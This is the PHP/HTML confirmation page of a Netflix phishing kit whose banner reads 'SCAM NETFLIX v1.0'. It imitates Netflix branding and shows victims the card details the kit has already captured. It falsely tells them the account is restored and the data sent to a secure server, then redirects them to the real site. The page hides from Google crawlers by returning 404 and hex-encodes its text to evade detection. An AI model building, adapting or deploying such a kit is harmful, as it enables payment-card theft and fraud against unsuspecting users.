<?php
/*   
   
    ───────────────────────────────────────────────────────────────────────────────────────────────────
    ─██████████████─████████──████████─██████████████─██████──██████─██████████████─████████████████───
    ─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
    ─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
    ─██░░██████████───████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
    ─██░░░░░░░░░░██─────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██████████░░██───────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
    ─────────██░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
    ─██████████░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
    ─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
    ─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
    ───────────────────────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM NETFLIX v1.0   #
                                        #    SYPHER.NETFLIX     #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
   
        session_start();
        error_reporting(0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_lang_en.php'); 
        include('../functions/get_ip.php');
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <meta charset="utf-8"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <title>&#x43;&#x6F;&#x6E;&#x67;&#x72;&#x61;&#x74;&#x75;&#x6C;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x21;</title>
      <link rel="preload" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-js-v4c579308/js/js/bootstrap.js,common%7Cbootstrap.js/2/4_034S4t4r4e4v0g084a4A4Z070u014-4z4m4C4w0d4Q4O4M4i4B4p4E4k4j19024V/bck/true/none" as="script"/>
      <link rel="preload" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-js-v4c579308/js/js/signup%7Csimplicity%7CsimpleSignupClient.js/2/4_034S4t4r4e4v0g084a4A4Z070u014-4z4m4C4w0d4Q4O4M4i4B4p4E4k4j19024V/l/true/none" as="script"/>
      <link type="text/css" rel="stylesheet" href="/ichnaea/cl2/freeform/WebsiteDetect?source=wwwhead&amp;fetchType=css&amp;modalView=signupSimplicity-creditOptionMode"/>
      <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-css-v4c579308/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/2/0z0O040H090w0G0T0W0P0I0Q0N0V0_/none/true/none"/>
      <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <link rel="stylesheet" type="text/css" href="../lib/css/bootstrap.min.css">
      <link rel="stylesheet" type="text/css" href="../lib/css/master.css">
      <link rel="stylesheet" type="text/css" href="../lib/css/set1.css">
      <meta http-equiv="refresh" content="4;url=https://www.netflix.com/youraccount"/>
   </head>
   <body>
      <div id="appMountPoint">
         <div class="basicLayout modernInApp pt19 signupSimplicity-creditOptionMode simplicity">
            <div class="nfHeader noBorderHeader signupBasicHeader">
               <a href="#" class="svg-nfLogo signupBasicHeader">
                  <svg class="svg-icon svg-icon-netflix-logo " xmlns="http://www.w3.org/2000/svg" width="1024" height="276.742" viewBox="0 0 1024 276.742">
                     <path d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676l-49.458-144.856v151.073c-15.404 1.621-29.457 3.783-44.051 5.945v-276.742h41.08l56.212 157.021v-157.021h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461v-255.39h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862v198.908c-14.594 0-29.188 0-43.239.539v-199.447h-44.862v-43.242h132.965l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433v-239.718h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676v-242.689h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242v-254.58h-42.43v251.338zm231.881-251.338l-54.863 131.615 54.863 145.127c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75-50.269-129.992h46.482l28.377 72.699 30.27-72.699h47.295z" fill="#d81f26"/>
                  </svg>
               </a>
               <a href="#signout" class="authLinks signupBasicHeader">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x6F;&#x75;&#x74;</a>
            </div>
            <div class="container NewXs456">
               <div class="row">
                  <div class="col-md-6 offset-md-3 LILUZIIII">
                     <center><img src="../lib/img/Congratulations.png" class="text-center" style="width: 20%;"></center>
                     <br>
                     <h1 class="siiniino text-center">&#x43;&#x6F;&#x6E;&#x67;&#x72;&#x61;&#x74;&#x75;&#x6C;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x21;</h1>
                     <p>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x72;&#x65;&#x73;&#x74;&#x6F;&#x72;&#x65;&#x64;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x61;&#x63;&#x63;&#x65;&#x73;&#x73;&#x2E;&#x20;&#x4E;&#x6F;&#x77;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x63;&#x61;&#x6E;&#x20;&#x75;&#x73;&#x65;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x61;&#x73;&#x20;&#x75;&#x73;&#x75;&#x61;&#x6C;&#x2C;&#x20;&#x61;&#x6C;&#x6C;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x68;&#x61;&#x64;&#x20;&#x62;&#x65;&#x65;&#x6E;&#x20;&#x73;&#x65;&#x6E;&#x74;&#x20;&#x69;&#x6E;&#x20;&#x65;&#x6E;&#x63;&#x72;&#x79;&#x70;&#x74;&#x65;&#x64;&#x20;&#x66;&#x6F;&#x72;&#x6D;&#x20;&#x74;&#x6F;&#x20;&#x6F;&#x75;&#x72;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x65;&#x20;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x20;&#x54;&#x68;&#x61;&#x6E;&#x6B;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x66;&#x6F;&#x72;&#x20;&#x75;&#x73;&#x69;&#x6E;&#x67;&#x20;&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x2E;&#x63;&#x6F;&#x6D;</p>
                     <label for="pm-info"><b>&#x50;&#x61;&#x79;&#x6D;&#x65;&#x6E;&#x74;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;</b></label>
                     <div class="pm-info" id="pm-info">
                        <p>
                           <span class="logos logos-block" style="float: left;margin-bottom: 7px;">
                           <?php if (substr($_SESSION['_cc_number_'],0,1) == 4): ?>
                           <span class="logoIcon VISA"></span>
                           <?php endif ?>
                           <?php if (substr($_SESSION['_cc_number_'],0,1) == 5): ?>
                           <span class="logoIcon MASTERCARD"></span>
                           <?php endif ?>
                           <?php if (substr($_SESSION['_cc_number_'],0,1) == 3): ?>
                           <span class="logoIcon AMEX"></span>
                           <?php endif ?>
                           &nbsp; •••• •••• •••• <?php echo $_SESSION['_last4_']; ?> 
                           </span>
                           <span class="logos logos-block" style="float: right;margin-bottom: 7px;">
                           <?php echo @$_SESSION['_expirationDate_MM_']."/20".@$_SESSION['_expirationDate_YY_']; ?>
                           </span>
                        </p>
                     </div>
                     <style type="text/css">
                        #more {
                        cursor:pointer;
                        }
                     </style>
   
                      <script type="text/javascript">
                        $(document).on('click','#more',function(e){
                        window.location = "https://www.netflix.com/youraccount/";    
                        });
                      </script>
                     <button class="btn login-button btn-submit btn-small" id="more" type="submit" autocomplete="off">&#x43;&#x4F;&#x4E;&#x54;&#x49;&#x4E;&#x55;&#x45;</button>
                  </div>
               </div>
               <br><br><br>
            </div>
            <br><br><br>
         </div>
         <br><br><br>
         <div class="site-footer-wrapper centered">
            <div class="footer-divider"></div>
            <div class="site-footer">
               <p align="center" class="footer-top"><a class="footer-top-a" href="#">&#x51;&#x75;&#x65;&#x73;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x3F;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x75;&#x73;&#x2E;</a></p>
            </div>
         </div>
      </div>
      </div>
   </body>
</html>